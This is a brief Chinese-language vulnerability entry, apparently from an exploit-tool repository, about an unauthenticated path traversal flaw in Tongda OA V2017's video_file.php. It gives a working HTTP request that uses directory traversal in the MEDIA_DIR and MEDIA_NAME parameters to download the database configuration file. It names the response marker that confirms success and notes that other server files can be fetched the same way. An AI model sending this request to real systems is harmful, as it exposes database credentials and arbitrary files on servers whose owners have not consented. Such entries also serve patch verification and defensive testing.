---
source: "LittleBear4/OA-EXPTOOL"
---

# 通达OA video_file.php 任意文件下载漏洞

## 漏洞描述

通达OA V2017 的 `/general/mytable/intel_view/video_file.php` 接口通过 `MEDIA_DIR` 与 `MEDIA_NAME` 参数拼接文件路径下载文件，未做有效校验，攻击者可通过目录遍历未授权下载服务器任意文件（如数据库配置文件）。

## 漏洞复现

```
GET /general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php HTTP/1.1
Host: target
```

响应状态码为 200，且响应体中包含 `MYSQL_DB` 即成功读取到 `inc/oa_config.php` 数据库配置文件内容。修改 `MEDIA_DIR` 与 `MEDIA_NAME` 可下载其他文件。

## 漏洞影响

```
通达OA V2017
```

## 参考链接

- https://github.com/jas502n/OA-tongda-RCE（模板标注的参考来源；本条目利用细节依据 OA-EXPTOOL 模板中的完整 PoC）
